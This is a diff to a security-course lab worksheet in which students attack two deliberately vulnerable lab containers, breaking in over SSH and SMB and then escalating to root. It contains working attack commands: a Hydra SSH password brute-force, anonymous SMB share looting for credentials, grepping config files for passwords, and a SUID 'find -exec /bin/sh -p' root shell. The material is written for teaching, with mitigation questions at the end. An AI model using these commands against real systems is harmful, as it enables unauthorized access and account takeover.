@@ -2,37 +2,75 @@
 
 ## Overview
 
-Enumeration and initial access get you a low-privilege foothold. This week is
-about the next step: turning that foothold into full control. You'll practice
-the three most common Linux privilege escalation vectors — misconfigured SUID
-binaries, writable cron jobs, and sudo misconfigurations — against two
-deliberately vulnerable targets.
+Getting a low-privilege foothold and turning it into root are two different
+skills. This week practices both, back to back: first you have to actually
+break into each target using techniques from earlier weeks (SSH password
+attacks, SMB enumeration), and only then do you escalate to root using the
+three most common Linux privilege escalation vectors — misconfigured SUID
+binaries, writable cron jobs, and sudo misconfigurations.
+
+Like every other week, you work from the attacker container and reach the
+targets over the network — nothing is handed to you via `docker exec`
+straight into a target this time.
 
 ## Lab Environment
 
 | Container | IP | Access |
 |-----------|-----|--------|
 | week8-attacker | 10.10.8.2 | `docker exec -it week8-attacker bash` |
-| week8-workstation | 10.10.8.10 | `docker exec -it -u lowpriv week8-workstation bash` (password: `lowpriv`) |
-| week8-ubuntu-desktop | 10.10.8.11 | `docker exec -it -u deskuser week8-ubuntu-desktop bash` (password: `deskuser`) |
-
-Both targets drop you in as a low-privilege user by default — the whole point
-is that you start with almost nothing and have to earn root.
+| week8-workstation | 10.10.8.10 | SSH only — earn access in Part 1 |
+| week8-ubuntu-desktop | 10.10.8.11 | SSH + SMB — earn access in Part 2 |
 
 ## Setup (5 minutes)
 
 ```bash
 make run-week8
-# Wait ~20 seconds for both targets to finish provisioning (creating users,
-# installing cron/sudo, planting the vulnerabilities below)
+# Wait ~30 seconds for both targets to finish provisioning (installing
+# openssh-server/samba, creating users, planting the vulnerabilities below)
 ```
 
-## Part 1: Linux Privilege Escalation — `week8-workstation`
+## Part 1: Break In, Then Escalate — `week8-workstation`
 
-### Task 1: Enumerate
+### Task 1: Gain Initial Access (SSH weak-password attack)
+
+From earlier recon on this network, you've identified that `week8-workstation`
+has a local account named `lowpriv`. You don't have its password yet.
 
 ```bash
-docker exec -it -u lowpriv week8-workstation bash
+docker exec -it week8-attacker bash
+
+# Confirm SSH is open
+nmap -sV -p 22 10.10.8.10
+```
+
+**Build a small password list** (matching the Week 6 approach — a short,
+targeted list, not a full rockyou run):
+```bash
+echo "password123" > /tmp/pw.txt
+echo "sunshine1" >> /tmp/pw.txt
+echo "letmein" >> /tmp/pw.txt
+echo "admin123" >> /tmp/pw.txt
+```
+
+**Brute-force it with Hydra:**
+```bash
+# -l <user> : the single username to try
+# -P <file> : password list — try each line as a candidate password
+hydra -l lowpriv -P /tmp/pw.txt 10.10.8.10 ssh
+```
+
+**What password did Hydra find?**
+
+_________________________________
+
+**Log in:**
+```bash
+ssh lowpriv@10.10.8.10
+```
+
+### Task 2: Enumerate
+
+```bash
 whoami
 id
 ```
@@ -73,12 +111,12 @@ negative-finding check, confirming what's actually secure vs. what isn't.)
 
 _________________________________
 
-### Task 2: Exploit
+### Task 3: Exploit
 
 **Path A — SUID binary (GTFOBins technique):**
 ```bash
 find / -perm -4000 -type f 2>/dev/null
-# Once you've spotted the SUID one from Task 1:
+# Once you've spotted the SUID one from Task 2:
 find . -exec /bin/sh -p \; -quit
 whoami
 ```
@@ -95,7 +133,7 @@ cat /tmp/user.txt
 
 _________________________________
 
-## Part 2: Linux "Server" Privilege Escalation — `week8-ubuntu-desktop`
+## Part 2: Break In, Then Escalate — `week8-ubuntu-desktop`
 
 The docx this worksheet is based on frames this target as "Windows-like" and
 lists `net user` / `mimikatz.exe`. Neither runs on a Linux container — there's
@@ -105,11 +143,37 @@ enumeration, hunting for exposed credentials, exploiting a privileged
 misconfiguration). See the note at the end of this worksheet if you want to
 try the real thing against an actual Windows target.
 
-### Task 1: Enumerate
+### Task 1: Gain Initial Access (SMB credential leak)
 
 ```bash
-docker exec -it -u deskuser week8-ubuntu-desktop bash
+# Confirm SMB is open
+nmap -sV -p 139,445 10.10.8.11
 
+# List shares anonymously
+smbclient -L //10.10.8.11/ -N
+```
+
+**Connect to the share you find and look around:**
+```bash
+smbclient //10.10.8.11/notices -N
+smb: \> ls
+smb: \> get notice.txt
+smb: \> exit
+cat notice.txt
+```
+
+**What credentials did you find, and where?**
+
+_________________________________
+
+**Log in:**
+```bash
+ssh deskuser@10.10.8.11
+```
+
+### Task 2: Enumerate
+
+```bash
 # Enumerate users and groups (Linux equivalent of net user / net localgroup)
 cat /etc/passwd
 getent group sudo
@@ -122,11 +186,12 @@ find / -name "*.conf" 2>/dev/null | grep -v "^/proc"
 grep -ri password /etc/app/*.conf 2>/dev/null
 ```
 
-**Question:** Did you find any hardcoded credentials? Where?
+**Question:** Did you find any *additional* hardcoded credentials beyond the
+one that got you in? Where?
 
 _________________________________
 
-### Task 2: Exploit
+### Task 3: Exploit
 
 **Check your sudo rights first — always the first move after any foothold:**
 ```bash
@@ -155,18 +220,25 @@ _________________________________
 
 ## Part 3: Reflection and Mitigation
 
-1. **Root cause:** For each vulnerability you exploited (SUID binary, writable
-   cron job, sudo NOPASSWD entry, hardcoded credential), what specific
-   misconfiguration made it possible?
+1. **Initial access:** The two ways in this week (SSH password guessing, SMB
+   credential leak) are different techniques but the same root problem. What
+   is that shared root problem?
 
    _________________________________
 
-2. **Mitigation:** How would you fix each one? Be specific — "use better
-   security" isn't a mitigation.
+2. **Root cause (escalation):** For each vulnerability you exploited (SUID
+   binary, writable cron job, sudo NOPASSWD entry, hardcoded credential),
+   what specific misconfiguration made it possible?
 
    _________________________________
 
-3. **Why it matters:** Why is privilege escalation described as a *critical
+3. **Mitigation:** How would you fix each one — both the initial-access
+   issues and the escalation issues? Be specific — "use better security"
+   isn't a mitigation.
+
+   _________________________________
+
+4. **Why it matters:** Why is privilege escalation described as a *critical
    step* in an attack chain, rather than just "a nice-to-have" for an
    attacker who already has a foothold?
 
